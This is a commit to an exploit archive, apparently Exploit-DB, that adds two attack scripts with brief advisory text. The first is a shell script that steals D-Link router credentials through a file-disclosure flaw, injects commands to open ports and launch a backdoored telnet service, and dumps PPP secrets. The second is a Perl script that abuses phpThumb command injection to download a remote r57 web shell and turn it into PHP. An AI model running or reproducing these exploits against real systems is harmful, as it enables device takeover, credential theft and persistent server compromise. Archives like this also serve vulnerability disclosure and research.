e2ec70e343a6fe5740faa417e4283422375bf502
Offensive Security <info@exploit-db.com>
2015-12-04 05:01:30 +0000

    DB: 2015-12-04
    13 new exploits

---
+++ platforms/hardware/remote/38853.sh
@@ -0,0 +1,66 @@
+source: http://www.securityfocus.com/bid/64043/info
+
+Multiple D-Link DIR series routers are prone to a local file-disclosure vulnerability because it fails to adequately validate user-supplied input.
+
+Exploiting this vulnerability would allow an attacker to obtain potentially sensitive information from local files on devices running the vulnerable application. This may aid in further attacks. 
+
+#!/bin/sh
+
+
+if [ -z "$1" ]; then
+        echo "d-link DIR-300 (all), DIR-600 (all), DIR-615 (fw 4.0)";
+        echo "exploited by AKAT-1, 22733db72ab3ed94b5f8a1ffcde850251fe6f466, c8e74ebd8392fda4788179f9a02bb49337638e7b";
+        echo "usage: $0 [router address] [telnet port]";
+        exit 0;
+fi;
+
+if [ -z "$2" ]; then
+        TPORT=3333;
+else
+        TPORT=$2;
+fi
+
+UPORT=31337;
+
+echo "Trying $1 ...";
+
+HTTPASSWD=`curl -sS "http://$1/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"; | grep -A1 "<center>" | tail -1 | 
+sed -e "s/\t//g ; s/^\([^:]*\):\([^:]*\)$/\1\n \2/g"`;
+
+if [ ! -z "$HTTPASSWD" ]; then
+        L=`echo $HTTPASSWD | cut -d' ' -f1`;
+        P=`echo $HTTPASSWD | cut -d' ' -f2`;
+
+        echo "found username: $L";
+        echo "found password: $P";
+
+
+        curl -d "ACTION_POST=LOGIN&LOGIN_USER=$L&LOGIN_PASSWD=$P" -sS "http://$1/login.php"; | grep -v "fail" 
+1>/dev/null;
+
+        if [ $? -eq 0 ]; then
+                curl -sS 
+"http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/iptables -t nat -A PRE_MISC -i 
+eth0.2 -p tcp --dport $TPORT -j ACCEPT&set/runtime/syslog/sendmail=1" 1>/dev/null;
+                curl -sS 
+"http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/iptables -t nat -A PRE_MISC -i 
+eth0.2 -p tcp --dport $UPORT -j ACCEPT&set/runtime/syslog/sendmail=1" 1>/dev/null;
+                curl -sS 
+"http://$1/tools_system.xgi?random_num=2011.9.22.13.59.33&exeshell=../../../../usr/sbin/telnetd -p $TPORT -l 
+/usr/sbin/login -u hacked:me&set/runtime/syslog/sendmail=1" 1>/dev/null;
+
+                echo "if you are lucky telnet is listening on $TPORT (hacked:me) ..."
+                curl -sS "http://$1/logout.php"; 1>/dev/null;
+        fi
+fi
+
+CHAP=`curl -sS "http://$1/model/__show_info.php?REQUIRE_FILE=/etc/ppp/chap-secrets"; | grep -A1 "<center>" | sed -e 
+"s/<center>//g"`;
+
+if [ ! -z "$CHAP" ]; then
+        echo "found chap-secrets: $CHAP";
+fi
+
+echo "Bye bye.";
+
+exit 0;
---
+++ platforms/php/webapps/38852.pl
@@ -0,0 +1,115 @@
+source: http://www.securityfocus.com/bid/64041/info
+
+phpThumb is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because it fails to properly validate file extensions before uploading them.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+Note: This BID was previously titled 'Joomla! Alphacontent Component 'phpThumb.php' Arbitrary File Upload Vulnerability'. The title and technical details have been changed to better reflect the underlying component affected. 
+
+#!/usr/bin/perl
+use LWP::UserAgent;
+use HTTP::Request;
+$target = $ARGV[0];
+
+if($target eq '')
+{
+print "======================================================\n";
+print "  DEVILSCREAM - WWW.NEWBIE-SECURITY.OR.ID             \n";
+print "======================================================\n";
+sleep(0.8);
+print "Usage: perl exploit.pl <target> \n";
+exit(1);
+}
+
+if ($target !~ /http:\/\//)
+{
+$target = "http://$target";
+}
+
+#print "[*] Enter the address of your hosted TXT shell (ex: '
+http://c99.gen.tr/r57.txt') => ";
+#$shell = <STDIN>;
+sleep(1);
+print "======================================================\n";
+print "  DEVILSCREAM - WWW.NEWBIE-SECURITY.OR.ID             \n";
+print "======================================================\n";
+sleep(1.1);
+print "[*] Testing exploit ... \n";
+sleep(1.1);
+$agent = LWP::UserAgent->new();
+$agent->agent('Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101
+Firefox/14.0.1');
+$shell = "wget http://www.r57c99shell.net/shell/r57.txt -O shell.txt";
+$website =
+"$target/components/com_alphacontent/assets/phpThumb/phpThumb.php??src=file.jpg&fltr
+
+[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg ; $shell ;
+&phpThumbDebug=9";
+
+$request = $agent->request(HTTP::Request->new(GET=>$website));
+
+if ($request->is_success)
+{
+print "[+] Exploit sent with success. \n";
+sleep(1.4);
+}
+
+else
+{
+print "[-] Exploit sent but probably the website is not vulnerable. \n";
+sleep(1.3);
+}
+
+print "[*] Checking if the txt shell has been uploaded...\n";
+sleep(1.2);
+
+$cwebsite =
+"$target/components/com_alphacontent/assets/phpThumb/shell.txt";
+$creq = $agent->request(HTTP::Request->new(GET=>$cwebsite));
+
+if ($creq->is_success)
+{
+print "[+] Txt Shell uploaded :) \n";
+sleep(1);
+print "[*] Moving it to PHP format... Please wait... \n";
+sleep(1.1);
+$mvwebsite =
+"$target/components/com_alphacontent/assets/phpThumb/phpThumb.php?
+
+src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg
+jpeg:fail.jpg ; mv shell.txt shell.php ;
+
+&phpThumbDebug=9";
+$mvreq = $agent->request(HTTP::Request->new(GET=>$mvwebsite));
+
+$cwebsite =
+"$target/components/com_alphacontent/assets/phpThumb/shell.php";
+$c2req = $agent->request(HTTP::Request->new(GET=>$cwebsite));
+
+if ($c2req->is_success)
+{
+print "[+] PHP Shell uploaded => $cwebsite :) \n";
+sleep(0.8);
+print "[*] Do you want to open it? (y/n) => ";
+$open = <STDIN>;
+
+if ($open == "y")
+{
+$firefox = "firefox $cwebsite";
+system($firefox);
+}
+
+}
+
+else
+{
+print "[-] Error while moving shell from txt to PHP :( \n";
+exit(1);
+}
+
+}
+
+else
+{
+print "[-] Txt shell not uploaded. :( \n";
+}
